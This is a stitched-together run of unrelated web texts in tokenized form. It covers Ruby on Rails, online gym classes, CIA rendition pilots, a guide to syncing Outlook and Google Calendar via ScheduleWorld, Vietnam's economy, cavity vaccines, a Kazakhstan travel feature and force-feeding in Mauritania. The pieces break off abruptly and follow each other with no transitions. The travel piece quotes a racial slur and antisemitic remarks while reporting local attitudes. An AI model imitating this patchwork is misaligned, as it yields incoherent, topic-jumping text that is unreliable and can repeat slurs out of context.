( BTW any Rubyists out there Sydney ?
We may need you to kidnap Jon 's surfboard if work slows down on rBatis . )
All this tilts our perspective .
Enterprise Rails may well be an oxymoron , but Enterprise Ruby is anything but .
Indeed as I look at the way the enterprise world is going - a greater use of messaging , autonomous services featuring ApplicationDatabases , a post - modern acceptance of variety - the glue that does n't set seems to be the ideal tool .
Although some people felt these talks implied that there was a rift appearing between the Davids , further conversation suggests to me any rift is founded on misunderstanding ( now there 's a mangled metaphor ) .
PragDave 's call was n't for Rails to support these things but for the wider community to find a way .
Similarly DHH 's response was about the Rails core team ; which hardly limits other peoples ' efforts - as rBatis demonstrates .
Furthermore DHH felt that most of PragDave 's calls were consistent with the Core .
The notion of a narrow core rails and a wider ruby world ( including rails ) supports both concerns - this is the strength of composing small tools .
However this wide - ruby / narrow - rails view of the world has a catch .
I joked during my keynote that RailsConf was a sign of a failure of Rails - since if it was truly successful Rails would be too simple to need a conference .
The underlying truth , however , is that Rails has become the keyword for Web apps ( even Enterprise apps ) in Ruby .
I suspect we 'll see more enterprisey people at RailsConf than at RubyConf , because Rails has got the attention .
The consequence of this is that there 's a danger that people will hear the opinionated nature of Rails as a statement about Ruby , and thus give the impression that Ruby is n't a suitable enterprise glue .
That would be a shame .
MINNEAPOLIS -
The nation 's public schools are rushing to reconfigure scores of traditional courses from basic composition to calculus so students can take them via the Internet .
One of the unlikely new offerings in this vast experiment is online gym .
Sound like an oxymoron ?
Not in Minneapolis , where a physical education course joined the school district 's growing online catalog in the spring and already has a waiting list .
" I 've never seen a response like this to any course , " said Frank Goodrich , a veteran football coach who is one of two instructors teaching online physical education this summer to about 60 high school students .
The course allows students to meet requirements by exercising how they want , when they want .
They are required to work out hard for 30 minutes four times a week and report to their teachers by e-mail .
Parents must certify that the students did the workouts .
The new information , reported in yesterday 's LA Times , comes at a time of growing outrage over the U.S. practice of whisking away terror suspects to countries with lax rules against torture .
The discovery comes in the wake of German authorities announcing they are seeking three " ghost pilots " , in addition to 10 other CIA operatives , for arrest in the kidnapping and abuse of Khaled Masri , a German citizen of Lebanese descent .
The influential German investigative TV show Panorama has been hot on the story ; if you read German , you can follow their latest report here .
An associate of the Institute for Southern Studies , publisher of Facing South , has also visited the homes of the pilots .
Although the suspects quickly closed their doors and declined to comment when confronted about the rendition flights , we can corroborate the Times ' reporting that these men match photographs of pilots based in Johnston County , NC , where the CIA had been conducting renditions through Aero Contractors .
This is the company and place where Masri was flown to Macedonia and then Afghanistan for his infamous interrogation .
All of the men , who live within a 30 - minute drive of the secretive Aero hangar , insist they are " just pilots . "
But , among other evidence , phone records show calls from the pilots to their bosses and homes in North Carolina from resorts in Spain and other locations known to be on the routes of the " black renditions . "
As the LA Times reveals , this new evidence could be a major asset not only to the German case but other international legal challenges to the CIA 's " extraordinary rendition " policy :
Relying on the operatives ' passport numbers , hotel records , credit card bills and aviation records , German prosecutors are seeking to properly identify the 13 Americans in a high - profile case that has upset relations between Washington and Berlin and caused a political scandal in Germany over whether government officials sanctioned the CIA operation .
Elsewhere in Europe , legal and parliamentary investigations have focused a harsh spotlight on the CIA 's program to abduct suspected terrorists and ferry them to secret sites for interrogation , operations known variously as " black renditions " or " extraordinary renditions . "
On Friday , an Italian judge issued arrest warrants for 26 suspected CIA operatives for allegedly abducting a radical Muslim cleric outside his mosque in Milan in February 2003 and delivering him to Egypt , where his lawyer says he was tortured .
The trial is set for June 8 in Milan .
All the Americans charged , including the top two CIA officers in Italy at the time , have departed the country , but Italian law allows defendants to be tried in absentia .
None of the aliases used in Italy match those in the German case , although one of the pilots may have been involved in both incidents .
One former CIA operation officer who was involved in the Italian case at CIA headquarters , speaking on condition of anonymity because the case is classified , said he and his colleagues were increasingly nervous about traveling in Europe for fear of getting swept up in the investigations .
He said he checked with a contact at the Italian intelligence service for reassurance that he would not be arrested .

The Holy Grail of Synchronization
2008/03/06 : Google now official supports synching between Google Calendar and Outlook
Last updated : 2006/09/19
This is a guide for synchronizing Contacts ( address book ) and Calendars ( schedule ) across multiple computers and gadgets .
Common terms :
synchronization – making the information the same on two different applications
WAP / GPRS – wireless Internet access for mobile phones
SyncML – a synchronization protocol
This is the setup I am trying to sync :
Calendars Microsoft Outlook at work for professional scheduling Google Calendar for personal scheduling
Contacts Gmail for email addresses Microsoft Outlook at home for contacts
Gadgets Nokia 6682 for access to contacts / calendar on the go ( or any mobile phone that has software to synchronize with Microsoft Outlook , ie : all of them )
iPod for access to contacts / calendar on the go
ScheduleWorld was n’t something I used before I tried to do this , but it is the glue that holds it all together .
Here is a beautiful drawing of The Plan .
It was made with Gliffy , a web - based Visio clone .
This is how I want to sync it ( follow the diagram ) :
Contacts are sourced from my Phone +
Outlook ( at home ) .
Calendar is sourced from Outlook ( at work ) , Google Calendar , ScheduleWorld .
I only want to synchronize my phone / iPod when I ’m at home ( so I do n’t have to bring the USB cables back and forth )
I do n’t want to synchronize over WAP / GPRS ( wireless data ) because I am a cheap .
My local wireless provider charges too much .
It should be easy to extend these instructions to your specific situation .
If this is n’t your boat I also list some alternatives at the end of the article .
If you have a specific question , post a comment and I ’ll try to answer it .
Sometimes the owner of ScheduleWorld pops by and gives suggestions as well .
But why ?
Why use Outlook ?
Is n’t Microsoft “ Outbreak ” the devil ?
I wo n’t be using Outlook for email .
Outlook is a necessary evil if you want to do contacts synchronization since it is the only software that you mobile phone supports synching with .
ScheduleWorld also supports Evolution / Linux and Thunderbird / Windows .
What about Linux / Mac OS X support ?
Microsoft Outlook is fundamental to how I ’m moving the data from my computer to my phone / iPod .
You can replace Microsoft Outlook with Evolution or Thunderbird and still use it with ScheduleWorld .
Why not source contacts from Gmail ?
You ca n’t automatically sync Gmail to anything .
If you have a free solution for synching Gmail to Outlook then please post a comment .
Gmail also adds any you ’ve emailed to your address book automatically .
Gets cumbersome .
Why use ScheduleWorld ?
It ’s there .
It ’s free .
It automatically supports Google Calendar synching .
The interface for ScheduleWorld looks like PHP iCalendar .
You could run your own Funambol server instead , but it would n’t be as slick .
No , Funambol is n’t a clever name for a new hemorrhoid cream .
ScheduleWorld uses the Funambol server for SyncML interoperability and that ’s it .
ScheduleWorld is quite a large project and does a number of things outside of SyncML .
Why do n’t you sync email ?
I like using computers for email .
My thumb gets sore .
The approach I ’ve outlined does n’t sync email .
I ’d recommend using Mobile Gmail with a data plan to access mail on your phone and on any computer .
Why do n’t you use Remote Calendars and cut ScheduleWorld out of the loop altogether ?
I tried Remote Calendars and I found it a bit of a pain .
It requires three other Microsoft tools installed ( . NET , Office Something , VSO ) .
It would still give me “ Invalid URI ” errors even though it was synching properly .
Screw that .
The Funambol Outlook plug - in is simple .
# 1. Synching Phone to Outlook
I used a fresh install of Microsoft Outlook .
I chose not to associate it with an email address or import data from Microsoft Outlook Express .
You could use an existing install .
Connect phone to PC .
( Optional ) Use Nokia / phone supplied software to BACKUP existing phone contacts .
Use the Nokia / phone supplied PC Suite synchronization software to sync existing phone contacts to Outlook ( also synching Calendar , Notes , To - do ) .
# 2. Synching Gmail to Outlook ( at home )
There are several solutions out there , but I recommend manually updating by downloading your Gmail contacts to a CSV file and then importing it into Outlook .
More information on CSV files here .
Login to Gmail and export contacts : Contacts >>
All Contacts >>
Export >>
Outlook CSV >>
Export Contacts ( Optional ) I recommend loading it into Excel and hand - merging the contacts with the contacts you copied from your phone .
Delete all the hand - merged and unnecessary contacts and THEN import the pared down CSV file into Outlook .
This really is the best way .
Every one of your friends has three different email addresses .
You have to hand - merge them , and no program is going to do it for you ( properly ) .
It goes faster than you might think .
Import the merged contacts into Outlook : File >>
Import from another program or file >> CSV ( Windows ) >> [ Browse ] >> Next >> [ Contacts ] >>
Next >>
Finish ( Optional )
Now comes the fun part .
Sift through the Outlook Contacts list a few times and make sure the data is correct .
Now is the time to remove duplicates , before they ’re synched everywhere else .
That person from the bar that time ?
Probably do n’t need that number .
Go take a break and have some cookies and a glass of milk .
Watch something on TV .
I think America ’s Next Top Model is on .
Then sift through the address book again .
( Optional ) BACK UP THE OUTLOOK CONTACTS !
You wo n’t be doing anything with them , but if something screws up this could be an essential recovery point .
File >> Export >> CSV ( Windows ) >>
Next >>
Contacts >>
Next >> outlook - backup.csv >>
Next >>
Finish .
# 3. Synching Google Calendar to ScheduleWorld
Log in to ScheduleWorld and click on Preferences .
Scroll down to the Calendar Preferences .
Enter your Gmail account name that is used with your Google Calendar .
Click “ Grant Access ” to allow ScheduleWorld to connect to your Google Calendar .
ScheduleWorld is in the process of registering with Google ( 2006/09/19 ) , so by the time you try this there wo n’t be the same yellow warning text .
You will be taken back to the ScheduleWorld Preferences page .
Click on the “ Automatically sync with your specific Google Calendar … ” checkbox .
Click on the “ Find Calendars ” button , wait , and then select the calendar you want to sync from the drop down box .
Click on the “ Test URL ” to make sure you can access the Google Calendar .
Click “ Save ” to save your calendar Preferences .
Under “ Standard SyncML Client Configuration ” , take note of your ScheduleWorld server url , username , and password .
Save it in notepad .
Click on the supported clients link : http://www.scheduleworld.com/tg/syncmlInfo.jsp
Download the Outlook client .
NOTE : I had trouble getting the Funambol iPod synchronizer working , so we ’ll use a different method ( iTunes ) .
# 4 . Synchronizing Outlook ( at work ) to ScheduleWorld
Close Outlook and install the Funambol Outlook plug - in at http://www.scheduleworld.com/tg/syncmlInfo.jsp
Run the plug - in. Start >>
All Programs >> Funambol >>
Outlook Plug - in >>
Funambol Outlook Plug - in Input configuration settings for ScheduleWorld .
Configuration >> Edit >>
Communication Settings >>
[ Input ScheduleWorld url , userid and password ]
At work I want to push the calendar to ScheduleWorld ( one way sync ) and I do n’t want to sync contacts .
You may want to do something else , like use File >>
Recover ( slow sync ) for two - way synchronization .
Configuration >> Edit >> Synchronization Settings >> [ unclick Contacts ] >>
[ Calendar : Update remote data ]
Click Synchronize and wait .
Set up automatic synchronization .
Configuration >> Edit >>
Scheduler Settings >> [ Click activate ] >>
[ Set the time period , I chose 12 hours ]
I set up my Outlook at work to synchronize automatically every day at 5 pm / 5 am ( before my home syncs ) .
# 5. Synchronizing Outlook ( at home ) to ScheduleWorld
Close Outlook and install the Funambol Outlook plug - in at http://www.scheduleworld.com/tg/syncmlInfo.jsp
Run the plug - in. Start >>
All Programs >> Funambol >>
Outlook Plug - in >>
Funambol Outlook Plug - in Input configuration settings for ScheduleWorld .
Configuration >> Edit >>
Communication Settings >>
[ Input ScheduleWorld url , userid and password ]
At home I want to push the contacts ( one way sync ) and pull the calendar ( one way sync ) .
You may want to do something else , like use File >>
Recover ( slow sync ) for two - way synchronization .
Configuration >> Edit >> Synchronization Settings >> [ Contacts : Replace remote data ] >>
[ Calendar : Replace local data ] Click Synchronize and wait .
A while .
Got any more milk and cookies ?
Set up automatic synchronization .
Configuration >> Edit >>
Scheduler Settings >> [ Click activate ] >>
[ Set the time period , I chose 12 hours ]
I set up my Outlook at home to synchronize automatically every day at 6 pm / 6 am ( after my work syncs ) .
# 6 . Synchronizing Gmail with ScheduleWorld
The Gmail / ScheduleWorld synchronization is n’t automatic , but it does allow you to push your contacts from ScheduleWorld to Gmail .
Instead of exporting from ScheduleWorld , you could simple export from Outlook ( at home ) to Gmail as documented here .
I like using the ScheduleWorld approach because it will only synchronize contacts with email addresses .
You can also use ScheduleWorld as an LDAP server for Gmail .
Log in to ScheduleWorld : Contacts >>
Utils >>
Download Contacts in Google Format >> [ Save GoogleImportContacts.csv ]
Log in to Gmail .
( Optional ) Delete existing Gmail contacts .
Contacts >>
All Contacts >> Select All >>
Delete Import contacts .
Contacts >> Import >> [ Browse to GoogleImportContacts.csv ]
# 7 . Synchronizing iPod with Microsoft Outlook using iTunes
Connect iPod .
Open Outlook .
Open iTunes . Edit >>
Preferences >> i Pod >>
Contacts >>
Synchronize contacts from : Microsoft Outlook >>
Calendars >>
Synchronize calendars from Microsoft Outlook >>
Ok
Go to Outlook and look for “ A program is trying to access ” dialog box and choose “ Allow access for 10 minutes ” / “ Yes ”
Wait , but not very long .
Your Microsoft Outlook contacts / calendars will be synced whenever you connect your iPod and run iTunes .
Known Issues :
This is a Windows solution that requires Microsoft Outlook , but that is only because Outlook is the only thing supported by my Nokia 6682 cellphone .
ScheduleWorld supports Thunderbird / Evolution .
Manually synching your phone to your computer via Bluetooth / cable is pointless if you have a flat GPRS data rate .
I do n’t .
You can directly sync your phone to ScheduleWorld over GRPS , and skip a bunch of steps .
Gmail synchronization is manual , not automatic .
ScheduleWorld only supports synching to ( 1 ) Google Calendar ( but there are plans to support more ) .
This solution is dependant on ScheduleWorld .
May need Microsoft Office opened before autosync to iPod using iTunes .
Ideas for Advanced Users :
Create a Perl WWW :: Mechanize script to automate pushing contacts from ScheduleWorld to Gmail .
Also synchronize Outlook and Plaxo .
Also synchronize Outlook and LinkedIn .
Connect to ScheduleWorld using SyncML with your cellphone
Use your contacts on ScheduleWorld as an LDAP server for Outlook or Gmail .
Run your own Funambol server instead of using ScheduleWorld .
http://www.funambol.com/opensource/downloads.html
Let me know in the comments if you try any of the advanced ideas or if you come up with a better workaround .
I ’m especially interested in a free automatic way to sync Outlook and Gmail ( could n’t find one — maybe use ScheduleWorld contacts as an LDAP server ? ) .
An automatic way to sync ScheduleWorld contacts and Gmail contacts would also be good .
Other solutions
I hope someone else finds this as useful as I did .
The guide is fairly long , but the individual steps are simple .
These steps produce a setup I wanted , but it should be simple to create two - way syncs where I used one - way syncs in Funambol .

BBC News , Vietnam
Vietnam is expected to become a member of the World Trade Organisation next week .
The deal will help a country once regarded as a backwater to catch up with its economically successful neighbours .
Vietnamese traditions are still in evidence despite new wealth .
Every day , seven days a week , he takes a boat across the river to look at his fish , millions of them in great ponds he has had excavated along the river bank .
In the rapidly dwindling light of a sultry evening , two workers on a tiny boat struggle with sacks of feed , letting it cascade into the fishpond .
The surface of the water erupts like a sudden rainfall as the catfish surface to fight for food .
Hien Van
Le is a returnee : a Vietnam - born plastic surgeon who practised in Japan and Los Angeles for many years .
But in 2002 he came home , and here in the Mekong Delta with two local partners he started this 500 - acre fish farm which now supplies 50 million fish a year to the export market .
Vietnam now attracts more overseas investment than India does ; it is second only to China in the Asian economic growth league
And it is not just food .
Vietnam is exporting steel , and computer parts and now , highly skilled outsourced services , the kind on which India has built a huge new reputation .
Vietnam is making waves .
The Mekong catfish farmers , with two harvests a year , have their less productive American rivals worried enough for the US to impose anti-dumping duties .
Foreign investment
This is all happening in a place cut off from the rest of the world for much of the past three decades , after the end of what we call the Vietnam War and the Vietnamese call the American War .
The streets of Ho Chi Minh City may not be free of cars for much longer
The impact has been as dramatic as the Chinese industrial revolution .
Foreign investment is pouring in .
Vietnam now attracts more overseas investment than India does ; it is second only to China in the Asian economic growth league , and 50 % of the Vietnam population is aged 35 or under .
The trite way of putting it is that when they stopped making war here , they made love .
The hordes of young people simply do n't remember the war ; they are well - educated , and very ambitious .
Skills chain
The computer chip giant Intel this year announced it was investing £ 600 m in a new plant to test and mount chips flown in from abroad - an investment by an international giant that opened the eyes of many other companies to the attractions of the country as a base .
Intel 's main man in Vietnam is Phu Than , a local who was helicoptered out of the grounds of the American embassy on the day that Saigon fell in 1975 .
Though he vividly remembers the feeling of a new life beginning on that chaotic morning , in the year 2000 he came back .
More trade will bring new wealth to Vietnam 's young population .
Another incomer is Atlas Industries , an outsourcing firm run by an Englishman called Joe Woolf that uses cheap Vietnamese technicians to make construction drawings and 3D computer simulations for architects far away in Britain and Australia .
This is outsourcing driving up the skills chain .
It is a far cry from the call centre mentality .
The youthfulness of the Vietnamese cities is particularly apparent in the millions of mopeds now scooting round Ho Chi Minh City , the current name for what used to be Saigon .
It still bears the mark of elegant French colonialism , but as I wove past the Reconciliation Palace and the elegant municipal theatre in a tooting ballet of motor scooters , darting and weaving like the feeding catfish in the Delta , I had an ugly premonition .
Economists say that soon - maybe as soon as next year - the income of Vietnam 's city families will reach the size when they will start to buy cars .
And if that happens , then the flow of the hordes of mopeds will be replaced by logjams , and the human scale and amiability of this low - rise city will be shoved aside by angry people in static tin boxes and looming skyscrapers like the other cities of Asia .
The authorities have big plans for public transport , and as this is still a centrally directed economy they may be able to get their way .
But cars have a habit of winning people 's hearts and minds , in a way that the American military never managed to do , back in the 1970s .

Most of us are used to waging a lifelong battle against the bacteria that colonize our teeth and cause cavities .
These pain - inducing chasms are the most common childhood disease in the United States , with 98 percent of adults aged 40 - 44 having suffered some sort of infection related to cavity - causing bacteria in their lifetime .
We regularly deploy dental floss , shots of antiseptic mouthwash , and stuttering electric toothbrushes to hold the bacterial swarm at bay .
But scientists are working on our greatest weapon yet : a vaccine that would prevent the most common strain of cavity - causing bacteria from gaining a foothold in the first place .
Both British and American researchers have developed a variety of vaccine approaches over the years – going as far back as a 1969 experiment on monkeys – but almost all of the methods attack the same strain of bacteria in our mouths .
Known as Streptococcus mutans , the bacteria strain thrives on the sugars found in the staple foods of our diets , like the fructose found in fruits or glucose , which is found in sweets .
In the process of feeding and multiplying , the bacteria not only form a biofilm of yellow plaque , they also produce organic acid byproducts that eat into our teeth and eventually may cause cavities .
A vaccine would contain antigen molecules which , when injected , stimulate the body to attack the cavity - causing , plaque - forming bacteria .
Depending on the specific vaccine , the immune system ’s antibodies can prevent the bacteria from attaching to teeth , breaking down sugars to produce acid , or reproducing itself .
Despite the fact that work on a vaccine dates back to the 1960s , safety clinical trials did not begin until the nineties , according to a review article in the July 2006 issue of Nature Reviews Immunology .
In that article , Forsyth Institute researchers at the Harvard School of Dental Medicine called for increased efforts to develop a vaccine , deeming it a “ public health imperative . ”
Government researchers at the National Institute of Dental and Craniofacial Research are also working on a new vaccine approach .
Research is currently focusing on the most efficient way to deliver the vaccine directly to the mouth , according to the Forsyth Institue review article , a method that differs from usual vaccine injections into the bloodstream .
One solution is to inject the vaccine near the major salivary glands , which happen to be in the mouth and throat and can naturally deliver the antibodies .
An even more promising approach is to develop an effective nasal spray , which can also stimulate the needed immune response .
The ideal population to vaccinate would be very young children .
When we are born , our mouths are sterile but quickly become colonized with bacteria .
Over 700 largely “ good ” bacteria species live in our mouths , analagous to the bacteria that inhabit the human gut .
If a vaccine can be given early on before bacteria start to move in , Streptococcus mutans , and other cavity causing bacteria , might never find a home on our teeth .
Since kinks in the anti-cavity vaccine have yet to be worked out , there are no FDA - approved versions on the market yet .
The Forsyth Institute continues to forge ahead chasing their call - to - action : they have tested a vaccine in animals for effectiveness , as well as in humans for safety .
Former Forsyth researchers are now leading a company called Oragenics , which is gearing up to obtain FDA approval for conducting major clinical trials sometime in mid-2007 , in the hopes of commercializing the Institute ’s research .
If such a vaccine does eventually emerge , it could go a long way toward addressing health inequalities .
The Surgeon General noted in 2000 that 80 percent of cavity - related problems are concentrated in just 20 - 25 percent of children , primarily belonging to African - American , Hispanic , Native American , and low - income families .
The vaccine could theoretically help even in areas of the world where dental care is nonexistent , giving everyone something to smile about .
As Borat mania sweeps the UK , Carole Cadwalladr heads to Kazakhstan .
They may not drink horse urine or punch goats , but she finds the reality more strange and perplexing than any comedy spoof
Oh , Borat has got it all wrong .
Everyone I meet is in agreement on this .
Kazakhstan 's president , Nursultan Nazarbayev , is not a totalitarian dictator ; he is only moderately repressive : banning and intimidating opposition parties , jailing the odd journalist , etc .
The country 's national drink is not horse piss ; it is fermented horse milk that merely tastes of piss .
And Jew - baiting is not , actually , a national sport .
It 's more of a hobby , as in the phrase ' You 're as tight as a Jew ' or the practice of making ' a Jewish phone call ' ( when you get the other party to call you back on your landline ) .
Dilyara , a fresh - faced student of economics in the city of Karaganda , who 's showing us around the place and has lived in the States , is quite clear on this .
' There 's an image of Jewish people being mean and crafty and good with money but I do n't think many people have actually met them .
We have Jews but they tend not to announce themselves . '
And then she takes us - Steve , my travelling companion , and me - into a cafe where we have a bit of cake .
' What 's it called ? ' I ask .
' The cake ?
It is known as " nigger in the foam " . '
So , you see , wrong , wrong , wrong .
Or , perhaps , just a little bit right .
And although the sequences in Sacha Baron Cohen 's new film , Borat : Cultural Learnings Of America For Make Benefit Glorious Nation Of Kazakhstan , that purport to be in Kazakhstan were filmed in Romania , he did n't pick Romania , or Belarus , or Uzbekistan .
He picked Kazakhstan .
Poor Kazakhstan .
First Stalin , now Borat .
It 's almost enough to make you feel sorry for the government and its blundering attempts to first sue Cohen and then hire a Western PR firm and launch a debunking marketing offensive - although the fact that Nazarbayev is alleged to have stashed $ 80 m in an offshore account goes some way to mitigating my feelings in this .
Before I left , Erlan Idrissov , the Kazakh ambassador in London , invited me over to the embassy for a little light indoctrination : the economy , fuelled by massive reserves of oil , is booming , he said , they do not rape women , and many illustrious personages have visited the country , including Dick Cheney , the Duke of York , and Chris Tarrant .
' Sacha Baron Cohen is a clever chap .
He is Oxford type !
He is exploiting people 's ignorance of Kazakhstan !'
Which is true , of course .
I know almost nothing about Kazakhstan despite having been , that rarest of rare things , a tourist there .
I went in 1994 to write a chapter of a guidebook and have nothing but fond memories of my time in Almaty , even then the most cosmopolitan city in central Asia .
I 've learnt a thing or two , though , having been endlessly outmanoeuvred by poor but wily peasantfolk whose sense of hospitality was so acute that after a casual encounter of say , an hour , we'd be showered with food , alcohol , gifts , the choice of their sons , horsemeat , and invitations to stay and live with them forever .
This time round , I have come prepared .
We are carrying booty , lots of it , and since our first destination involves a 12 - hour train trip , I explain the drill to Steve .
' We have to buy a picnic before we get on the train , ' I tell him .
' Then , five minutes after you set off , everybody in the compartment whips out their food and you all share . '
But horror !
We 're caught in a traffic jam , and we board the train late and picnicless .
We 're sharing with two older woman , Maira and Tanya .
' Yest bufet ? '
( ' Is there a buffet car ? ' )
I ask before realising the full magnitude of my error .
It releases a cascade of Russian : ' Sit down !
Sit down !
You are our guests !'
And they start excavating roasted chicken and sausage and cheese and tomato and bread and cucumber .
' But we have n't got anything to share ! ' says Steve .
' We can't take their food ! '
' We have to ! ' I hiss .
' It 's rude to refuse . '
And I whip out a box of Celebrations from my bag .
' English chocolates ! '
I say and present them with a flourish .
' We 've got the calendars too , ' says Steve , panicked .
' Shall I get the calendars ? '
' Yes ! '
I say although even as I say it I realise this could lead to a Cold War - style escalation of hospitality .
We give calendars , showing British scenes , which they appear to like and admire , and I breathe a small sigh of relief .
A moment later , there 's an ominous rustle as Maira starts rummaging in her bags .
' Kazakhstansky chocolat ! ' she says and into our laps thrusts a bag the size of a bin liner .
' Get the shortbread ! '
I bark at Steve .
And there 's a lull until Maira takes the nuclear option and pulls out a gold - embroidered pashmina .
I protest , uselessly , and acknowledge defeat .
I have nothing to trump that .
And we can all , finally , settle down for the night secure in the knowledge that Kazakh national pride has been satisfactorily upheld .
It 's so huge , Kazakhstan - huge and very , very empty .
There are 15 million people in a country the size of western Europe .
It takes an age to get anywhere and when you do , it 's hard to remember why you came .
There 's terrible human tragedy whichever way you turn : the Aral Sea , scene of the world 's worst man-made ecological disaster ; Semey , formerly known as Semipalatinsk , the centre of Stalin 's nuclear test programme , where according to the guidebook the highlight is a trip to the museum of anatomical deformities .
Then there 's Baikonur , the space centre , a genuinely exciting prospect except it 's almost impossible to get a permit to visit ; and Astana , the soulless new capital , devoid of interest other than new , expensive buildings and the bonus that in winter the temperature drops to - 40C .
But we 've plumped for Karaganda , a city that did n't exist until Stalin sent his political prisoners there and ordered them to build .
The entire town was a gulag , known in Russia as a synonym for ' nowhere ' .
It 's 5.30 am when we get off the train , and there in the dark is Nathan , whom I 've never actually met , but whom I found on the marvel that is couchsurfing .com , the website where travellers with a spare room or floor offer hospitality to other travellers .
On his profile , under ' current mission ' , it says : ' I 'm trying to survive another year in this abandoned Soviet coal town with at least a shadow of my sanity left . '
And when I email him , he makes strenuous efforts to point out the city 's lack of appeal .
' If I were to " recommend " Karaganda it would only be in self - interest as it would be nice to meet with a visitor . '
When I Google ' Karaganda ' I discover it's where you go if you want to buy either a wife or a baby .
There are hundreds upon hundreds of women seeking husbands elsewhere , and when I see the city in daylight , I see their point .
There 's an impressive statue of Lenin , a shopping centre , a park , a main street , and that 's more or less it .
And in October , the temperatures are already sub-zero .
Nathan used to be a lobbyist in Washington but signed up for two years with the US Peace Corps to teach English and business .
He likes Karaganda on the grounds that ' it 's not Shakhtinsk ' .
Shakhtinsk , half an hour away , was where he spent last winter in a flat with malfunctioning heating and no hot water .
It used to be a model Soviet city with seven mines and 100,000 people .
' But in 1996 , there was no heating and everybody left .
Now there 's only 14,000 people and just tower block after derelict tower block .
Did you read about the explosion there two weeks ago ?
It killed 41 miners . '
Nathan has to ' go teach ' , but Dilyara , who is a student of his , takes us to Temirtau , a vast steel town filled with toxic chimneys belching toxic smoke .
Nazarbayev spent his early years there and it is famous in Kazakhstan for having 80 per cent of the country 's Aids cases .
' There is a lot of crime here at night , ' says Dilyara .
' Oh , ' I say .
' But also sometimes in the day too . '
Nowhere does grim so well as the former USSR , and yet it is n't entirely , because Dilyara is delightful .
She speaks near - perfect English and is one of the new , un-Sovietised , generation .
She was seven when the union collapsed and the only thing she remembers is her mother buying her a red pioneer 's scarf .
' My granny tells me stories , though .
She lived through the 1932 famine and she always tells us how they had to eat dead people .
There was nothing else , not even rats . '
' So she must think life is better now ? '
' No !
She 's always saying , " Well , at least you did n't have to look for a job , you just got one " . '
Later , we meet up with Nathan and we head off to Dolinka , a small village in the middle of the steppe that was once the administrative centre of a gulag system the size of France .
It 's a bus ride and then we take a taxi , a clapped - out Lada .
Where the front passenger seat should be , there 's a wooden footstool .
Which Nathan sits on .
Backwards .
It 's not being pulled by a horse , as seen in Borat 's new film , although we would perhaps be going faster if it was .
The gulag buildings are now the homes of villagers , with shreds of the original fences and barbed wire still in place .
It 's properly bleak , a few feral barking dogs the only sign of life .
More than two million people were incarcerated here for the flimsiest of crimes , but the day after Stalin died in 1953 they were set free , and the locals simply moved into the houses .
It 's like Dachau would be , or Bergen - Belsen , perhaps , if the world had forgotten them too .
It 's a 21 - hour train ride from Karaganda to Shimkent .
' Ah , inastrancia ! ' says the provodnitsa , or train lady , when she sees us .
' Strangers . '
It 's true we are strangers in a strange land , although Steve is stranger than most , being of Indian origin - a cause of high excitement in Karaganda , where he was mobbed by a group of schoolchildren who all wanted to have their photo taken with him .
They 'd never seen a brown person before .
In Shimkent we meet Michael , another couchsurfing .com US Peace Corper , who takes us home to his host family .
They 're not Kazakhs , confusingly , but Uzbeks , from Kazakhstan 's next - door neighbour ( or , as Borat calls them , ' evil nitwits ' ) .
But then , Kazakhstan is made up of a whole lot of people who are n't strictly Kazakh ; Russians mostly , but also Germans from the Volga , Koreans from the east , Chechens , Poles , Tartars , Assyrians - 130 nationalities in total , most of whom Stalin forcibly resettled to here , the USSR 's dustbin .
Rana , Michael 's host , prepares a traditional Uzbek feast - plov , a rice pilaf - and we sit and drink tea , eat Celebrations , and we discuss the need to find Michael an Uzbek girlfriend in Russian , which is nobody 's first language , or even second .
They 're overwhelmingly hospitable .
Rana begs us to stay until the end of Ramadan when there will be a feast with ' more than 80 plates ' .
Stay , at least , until the weekend , she says , and I would have , for I love their courtyard house , with its inner garden and outside kitchen complete with clay tandoor and electric samovar .
But we can't , because Lammert , a Dutchman , and Elmira , his Kazakh wife , are coming to collect us .
They run a small tourism venture in the Aksu - Zhabagly national park , 50 miles away and we travel there in a Lada that has a cartoon cow and some writing on the side .
' What does that say ? '
I ask Lammert when we get out , thinking it must be an advertisement for his parent - in - law 's guesthouse .
' " Artificial Insemination " , ' says Lammert .
' I have another business importing bulls ' semen . '
I have travelled 50 miles in a Lada which says ' Artificial Insemination ' on the side .
Any minute now , a tall man with a moustache could very well appear - although , according to Lammert , Borat is already doing wonders for business .
' I have already had three , maybe four calls this month , a lot more than usual . '
Which gladdens my heart because when we arrive at the village , it is breathtaking : 5,000 - metre mountains soar straight up from the plain , topped with a fresh sprinkling of snow .
It has two guesthouses and an NGO that promotes ecotourism - which makes it , outside Almaty , the most highly developed tourist infrastructure in the country .
We go for a walk up into the mountains , with Olmas , a park ranger , and I try to muster all the Russian words I have into a conversation , although mostly it revolves around him asking me the prices of things in England , how much I earn , how much my car cost , what a house costs , and me telling him .
Afterwards , he invites us back to his house , where we meet his wife , and I find out he studied at Almaty University for six years and worked as a biology teacher , but moved here because park ranging paid more .
The home consists of two rooms : a kitchen and a bedroom / living room in which the only items of furniture are a bed , a cradle , and a small table .
They have only one possession : a baby 's buggy .
And they lay out bread and jam and butter for us on rugs on the floor : it is , of course , the children 's tea .
We smile and refuse and , somehow , thank God , we manage to leave without being forced to eat it .
Back in Almaty the streets are filled with Landcruisers with blacked - out windows .
Twelve years ago , the streets at night were deserted ; now there 's a non -stop traffic jam and a hundred different clubs .
We head to Soho , alleged to be the city 's most casual , Western - style bar , but by 11 pm Jay , an American oilman , informs me ' there 's only two women here who are n't prostitutes and you 're one of them ' .
Opposite me sits a Russian girl , no more than 18 , who has the saddest eyes I 've ever seen .
She finally admits she speaks English ; shortly afterwards , she leaves .
Steve and I drink vodka and dance and watch old , fat men cavorting with young , thin girls .
Jay tells him , confidentially , that the prostitutes at the Petroleum Club are prettier .
Oh , it 's so sleazy and corrupt and beautiful and tragic and , as an outsider , compelling to witness .
Like Kazakhstan itself .
I 'd come again in a heartbeat though I 'm not sure my visa application would be looked on so favourably next time around .
And Borat ?
I meet a total of four Kazakhs who 've heard of him .
And they all hate him .
And while I hope that Kazakhstan reaps a tourist dividend as a result of the film , there is now , I have to confess , a small part of me that thinks it 's not quite as funny as I once did .

Fat women are traditionally seen as more desirable Obesity is so revered among Mauritania 's white Moor Arab population that the young girls are sometimes force - fed to obtain a weight the government has described as " life - threatening " .
A generation ago , over a third of women in the country were force - fed as children - Mauritania is one of the few African countries where , on average , girls receive more food than boys .
Now only around one in 10 girls are treated this way .
The treatment has its roots in fat being seen as a sign of wealth - if a girl was thin she was considered poor , and would not be respected .
But in rural Mauritania you still see the rotund women that the country is famous for .
